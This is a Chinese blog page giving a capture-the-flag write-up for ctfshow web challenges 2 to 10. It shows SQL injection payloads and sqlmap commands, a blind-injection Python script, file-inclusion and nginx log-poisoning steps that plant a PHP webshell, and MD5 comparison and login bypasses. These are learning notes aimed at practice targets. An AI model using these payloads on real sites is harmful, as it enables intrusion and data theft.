@@ -1,0 +1,368 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ctfshow-web2-10 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="web2post传参，保存抓包内容，直接用sqlmap跑。
+
+web3
+include()函数想到文件包含，burp抓包进行尝试：
+先使用老套路php://input伪协议进行post传参，发现返回,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ctfshow-web2-10</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ctfshow-web2-10</h1>
+        <div class="stuff">
+            <span>八月 08, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/ctfshow%E5%88%B7%E9%A2%98/" rel="tag">ctfshow刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>post传参，保存抓包内容，直接用sqlmap跑。</p>
+<p><img src="1.png"></p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p><img src="2.png"></p>
+<p>include()函数想到文件包含，burp抓包进行尝试：</p>
+<p>先使用老套路php://input伪协议进行post传参<?php phpinfo();?>，发现返回了phpinfo的界面，使用ls列出目录和文件：</p>
+<p><img src="3.png"></p>
+<p>查看内容，获得flag：</p>
+<p><img src="4.png"></p>
+<h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>include()函数判断为文件包含，刚开始利用php://filter/convert.base64-encode/resource=index.php读取源码，返回error。</p>
+<p>参照别人的wp,</p>
+<p>通过抓包得知网站的服务器为ngnix：</p>
+<p><img src="5.png"></p>
+<ul>
+<li>结合题目的文件包含漏洞，进行文件日志包含。</li>
+</ul>
+<ul>
+<li>nginx中间件日志文件路径：</li>
+</ul>
+<p>/var/log/nginx</p>
+<p>错误日志：</p>
+<p>/var/log/nginx/error.log</p>
+<p>正确日志：</p>
+<p>  /var/log/nginx/access.log</p>
+<p>尝试通过参数url传参，发现access.log可以打开。</p>
+<ul>
+<li>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。</li>
+</ul>
+<p><img src="6.png"></p>
+<p>因此可以通过抓包，在user-agent处修改之后再放包，将一句话木马上传到日志：</p>
+<p><img src="7.png"></p>
+<p>连接蚁剑得到flag。</p>
+<p><img src="8.png"></p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p> ctype_alpha() 函数检测字符串中所有字符是否都为字母。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!ctype_alpha(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$v1</span>)==md5(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ul>
+<li>代码比较短，要判断v1的值是否每一位都为字符，v2传入的每一位都是数字，且它们的md5加密后弱比较相等。</li>
+</ul>
+<p>​     一开始尝试的数组发现没有办法绕过这两个检验函数，因此想到用加密后0e开头的值进行传参，<strong>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</strong></p>
+<ul>
+<li><strong>因此需要找到一个全为字母加密后为0e开头的字符串以及全为数字的md5加密后为0e开头的字符串：</strong></li>
+</ul>
+<p><strong>在下面这篇文章中有相同的检验元素，并且给出纯数字的字符串为：240610708</strong></p>
+<ul>
+<li>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30741979/article/details/116393917">https://blog.csdn.net/weixin_30741979/article/details/116393917</a></li>
+</ul>
+<p>v1传入QNKCDZO</p>
+<ul>
+<li>payload：?v1=QNKCDZO&amp;v2=<strong>240610708</strong></li>
+</ul>
+<p><strong>得到flag。</strong><br/></p>
+<p><img src="9.png">   <br/><br/><br/><br/></p>
+<h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>​       这个题目其实也就是一个很常规的过滤了空格的单引号注入。但是输入单引号并没有相关的SQL报错语句进行显示，尝试过程中发现过滤了空格，输入空格的时候会有SQL注入错误的回显。所以一开始是尝试了报错注入、时间盲注的方法，发现也没有什么回显。查看wp发现就是单引号注入：</p>
+<p>报错语句不显示的这个点可能也跟后端代码有一定的关系吧。</p>
+<p>​      目前的“@”错误控制运算符前缀甚至使导致脚本终止的严重错误的错误报告也失效。这意味着如果在某个不存在或类型错误的函数调用前用了“@”来抑制错误信息，那脚本会没有任何迹象显示原因。</p>
+<p>尝试联合查询返回显示位，用/**/代替空格，爆破如下：</p>
+<p><img src="10.png"></p>
+<p><img src="11.png"></p>
+<p><img src="12.png"></p>
+<p><img src="13.png"></p>
+<p>也可直接在sqlmap中利用过滤空格的脚本进行爆破：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">&quot;2.txt&quot;</span> --tamper <span class="string">&quot;space2comment.py&quot;</span> --current-db   </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>初始界面每点一篇文章URL处都会有id参数的变化，推测为SQL注入，抓包进行尝试。</p>
+<p><img src="14.png"></p>
+<p><img src="15.png"></p>
+<p>可以看出是布尔盲注，我的菜鸡脚本跑不了，还是用sqlmap跑吧~</p>
+<p>空格的过滤还是/**/替换，所以用的还是space2comment.py这个脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://374570ee-de87-4e12-b37d-840b226542f2.challenge.ctf.show:8080/index.php?id=1&quot; --tamper &quot;space2comment.py&quot; -current-db</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://374570ee-de87-4e12-b37d-840b226542f2.challenge.ctf.show:8080/index.php?id=1&quot; --tamper &quot;space2comment.py&quot; -D &quot;web7&quot; -tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://374570ee-de87-4e12-b37d-840b226542f2.challenge.ctf.show:8080/index.php?id=1&quot; --tamper &quot;space2comment.py&quot; -D &quot;web7&quot; -T &quot;flag&quot; -columns</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://374570ee-de87-4e12-b37d-840b226542f2.challenge.ctf.show:8080/index.php?id=1&quot; --tamper &quot;space2comment.py&quot; -D &quot;web7&quot; -T &quot;flag&quot; -C &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到flag。</p>
+<p><img src="16.png"></p>
+<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p> SQL注入，还是SQL注入（呜呜呜）</p>
+<p>尝试union发现不行，也尝试用了一下盲注，我一开始并没有判断出来它就是布尔盲注，这判断回显我还是有点点懵，看了一下wp知道是布尔盲注，空格依旧是/**/进行过滤，同时也过滤了逗号，逗号的过滤方法原来看过，用from..for..来绕过的：</p>
+<p><img src="17.png"></p>
+<p>自己的破烂的小脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://62a0d3a2-cae9-4e38-9ce8-ce033e4fdbe5.challenge.ctf.show:8080/index.php&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="comment">#for i in &#x27;0123456789abcdefghijklmnopqrstuvwxyz_?`&#123;(&#125;*&#x27;:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆破表名</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line">        <span class="comment">#爆破列名</span></span><br><span class="line">        payload = <span class="string">&quot; ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(j))</span><br><span class="line">        <span class="comment">#爆破字段内容</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)/**/from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i),<span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        success_url = url +<span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload</span><br><span class="line">        <span class="comment">#print(success_url)</span></span><br><span class="line">        ra = requests.get(success_url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;I asked nothing&quot;</span> <span class="keyword">in</span> ra.text:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>要注意的一点是：在爆破字段名的语句中表的名字不是直接写flag，而是要用十六进制数表示，可能是对单引号也进行了过滤的原因，直接写flag是爆破不了的。</p>
+<p><img src="18.png"></p>
+<p>终于跑出来了~~~</p>
+<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul>
+<li>刚登进去也以为是常规的SQL注入，给了用户名，但是抓包进行注入的尝试也好像没有发现什么东西，所以就扫了一下目录，发现有robots.txt和index.phps 。访问index.phps得到一个源码文件：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>其中mysqli_query、mysqli_num_rows、mysqli_fetch_assoc都是MySQL判断登录时的一些函数。</p>
+<p>代码中有一个SQL语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>md5()函数的语法:</li>
+</ul>
+<p>md5(<em>string</em>,<em>raw</em>)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><em>string</em></td>
+<td>必需。规定要计算的字符串。</td>
+</tr>
+<tr>
+<td><em>raw</em></td>
+<td>可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td>
+</tr>
+</tbody></table>
+<ul>
+<li>因此代码中.md5($password,true)即密码返回的是一个原始的二进制字符：</li>
+</ul>
+<p>content: ffifdyop</p>
+<p>hex: 276f722736c95d99e921722cf9ed621c</p>
+<p>raw: ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</p>
+<p>string: ‘or’6]!r,b</p>
+<p> 这里需要注意的是，当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是  ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c  这种。</p>
+<p>​       上面的’ffifdyop‘字符串对应的16位原始二进制的字符串就是”    ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c    “  。  ‘  \  ‘后面的3个字符连同’  \  ‘算一个字符，比如’    \xc9    ‘，所以上述一共16个。当然，像’    \xc9    ‘这种字符会显示乱码。</p>
+<ul>
+<li>因此我们可以传入ffifdyop，使得SQL语句变成：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user where username =<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password =‘<span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1c’</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断条件变为or，从而绕过密码成功登录：</p>
+<p><img src="19.png"></p>
+<ul>
+<li>内容参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></li>
+</ul>
+<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>跟web9一样的界面，所以还是先扫了一下目录，index.phps，访问下载源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		<span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>)!=strlen(replaceSpecialChar(<span class="variable">$username</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>)!=strlen(replaceSpecialChar(<span class="variable">$password</span>)))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>(<span class="variable">$row</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">						<span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">							<span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">							<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ul>
+<li>可以看到过滤了很多的关键字，没办法进行联合注入、延时盲注等，对输入的用户名和密码也进行了长度的限定。</li>
+</ul>
+<ul>
+<li>这个题目是用到了MySQL的两个语句：</li>
+</ul>
+<p>①group by（将结果集中的数据行根据选择列的值进行逻辑分组）：</p>
+<p>在MySQL数据库中进行数据查询时使用group by查询的话，会将所查询的对象按照顺序排列，将password名称所在列和密码所对应的值（value）对应展示，如果查询的是密码，使用group by之后会按照password本身名称的首写字符按照ascii值进行排列，小的在上方，大的在下方；</p>
+<p>②with rollup （group by 后可以跟with rollup，表示在group up的基础上进行汇总统计）</p>
+<p>   因此使用with rollup之后，会生成一条password列列名为null的一条新的数据，所对应的值就是group up后的value的总和。而如果查询结果是唯一的，会生成password所在列列名为null的数据。</p>
+<ul>
+<li>因此可以使用如下payload：</li>
+</ul>
+<p>​     payload:username=admin’/<strong>/or/</strong>/1=1/<strong>/group/</strong>/by/<strong>/password/</strong>/with/**/rollup#&amp;password=</p>
+<p>因为加入with rollup后 password有一行为NULL，我们只要输入空密码使得（NULL==NULL）即可满足$password==$row[‘password’]的限制成功登陆。</p>
+<p><img src="20.png"></p>
+<p>​     </p>
+<p>对于这个题目的话，就还是积累一些知识点叭，因为原来做题目也是没有遇到过这些相关的内容，所以做题的时候是没什么思路的，按照别人的博客一步步看的话，去理解这些点就也觉得是可以接受的。</p>
+<ul>
+<li>文章指路：</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45940434/article/details/104351722">https://blog.csdn.net/weixin_45940434/article/details/104351722</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104351624">https://blog.csdn.net/miuzzx/article/details/104351624</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-number">1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web3"><span class="toc-number">2.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web4"><span class="toc-number">3.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web5"><span class="toc-number">4.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web6"><span class="toc-number">5.</span> <span class="toc-text">web6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web7"><span class="toc-number">6.</span> <span class="toc-text">web7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web8"><span class="toc-number">7.</span> <span class="toc-text">web8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web9"><span class="toc-number">8.</span> <span class="toc-text">web9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web10"><span class="toc-number">9.</span> <span class="toc-text">web10</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
